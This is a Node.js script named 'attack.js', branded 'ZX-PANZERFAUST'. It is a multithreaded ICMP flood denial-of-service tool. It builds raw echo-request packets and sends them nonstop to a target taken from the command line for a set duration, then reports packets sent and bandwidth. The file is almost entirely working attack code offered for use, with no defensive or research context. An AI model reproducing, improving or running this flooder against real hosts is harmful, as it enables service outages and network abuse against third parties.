const { Worker, isMainThread, parentPort } = require('worker_threads');
const os = require('os');
const process = require('process');
const raw = require('raw-socket');

// Detect the number of CPU cores available
const cpuCount = os.cpus().length;
const [target, time] = process.argv.slice(2);
if (!target || !time) {
    console.log("Usage: node attack.js <target> <time>");
    process.exit(1);
}

// Set number of threads based on CPU cores (max 20 threads)
const maxThreads = 20;
const threads = Math.min(cpuCount, maxThreads); // Scale the number of threads based on CPU cores, but don't exceed 20

// Worker thread function
const startWorker = (id) => {
    const socket = raw.createSocket({ protocol: raw.Protocol.ICMP });

    let pings = 0;
    let packets = 0;
    let totalBytes = 0; // To track total bytes sent
    const packetSize = 64; // Each ICMP packet size (64 bytes by default)
    const endTime = Date.now() + (parseInt(time) * 1000);

    const createPacket = () => {
        const buffer = Buffer.alloc(packetSize);
        buffer.writeUInt8(8, 0); // Type 8 (Echo Request)
        buffer.writeUInt8(0, 1); // Code 0
        buffer.writeUInt16BE(0, 2); // Checksum placeholder
        buffer.writeUInt16BE(process.pid & 0xffff, 4); // ID
        buffer.writeUInt16BE(pings & 0xffff, 6); // Sequence number
        for (let i = 8; i < packetSize; i++) {
            buffer[i] = i % 255; // Fill the packet with data
        }

        // Calculate checksum
        let sum = 0;
        for (let i = 0; i < buffer.length; i += 2) {
            sum += buffer.readUInt16BE(i);
        }
        sum = (sum >> 16) + (sum & 0xffff);
        sum += (sum >> 16);
        const checksum = ~sum & 0xffff;
        buffer.writeUInt16BE(checksum, 2); // Write checksum to packet
        return buffer;
    };

    const blast = () => {
        if (Date.now() > endTime) {
            parentPort.postMessage({ pings, packets, totalBytes });
            return;
        }

        try {
            const packet = createPacket();
            socket.send(packet, 0, packet.length, target, () => {});
            pings++;
            packets++;
            totalBytes += packetSize;  // Add packet size to total bytes
        } catch (e) {}

        setImmediate(blast);
    };

    blast();
};

if (isMainThread) {
    // Main thread: spawn worker threads for parallelism
    const workerData = [];

    console.log(`Starting attack with ${threads} threads based on ${cpuCount} CPU cores...`);

    for (let i = 0; i < threads; i++) {
        const worker = new Worker(__filename);
        worker.on('message', (data) => {
            workerData.push(data);
            const totalPings = workerData.reduce((acc, curr) => acc + curr.pings, 0);
            const totalPackets = workerData.reduce((acc, curr) => acc + curr.packets, 0);
            const totalBytes = workerData.reduce((acc, curr) => acc + curr.totalBytes, 0);

            // Calculate bandwidth
            const bandwidth = totalBytes / 1024 / 1024; // MB
            const pps = totalPings / time;  // pings per second
            const pktps = totalPackets / time;  // packets per second
            const bandwidthPerSec = totalBytes / (time * 1024 * 1024);  // MB/s

            process.stdout.write(`\x1BcZX-PANZERFAUST\npings: ${totalPings}\npackets: ${totalPackets}\nbandwidth: ${bandwidth.toFixed(2)} MB\npings per second: ${pps.toFixed(2)}\npackets per second: ${pktps.toFixed(2)}\nbandwidth per second: ${bandwidthPerSec.toFixed(2)} MB/s\n`);
        });
        worker.postMessage({ target, time });
    }
} else {
    // Worker thread
    startWorker();
}
